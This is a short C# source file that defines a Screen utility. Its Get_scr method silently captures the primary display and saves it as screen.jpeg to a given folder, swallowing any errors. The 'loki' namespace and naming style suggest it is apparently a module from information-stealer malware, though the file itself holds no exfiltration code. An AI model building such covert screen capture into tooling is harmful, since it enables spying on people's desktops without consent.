namespace loki.loki.Utilies
{
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;

    internal class Screen
    {
        public static void Get_scr(string string_0)
        {
            try
            {

                int width = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Width;
                int height = System.Windows.Forms.Screen.PrimaryScreen.Bounds.Height;
                using (var bitmap = new Bitmap(width, height))
                {
                    Graphics.FromImage(bitmap).CopyFromScreen(0, 0, 0, 0, bitmap.Size);
                    bitmap.Save($"{string_0}\\screen.jpeg", ImageFormat.Jpeg);
                }
            }
            catch (Exception) { }
        }
    }
}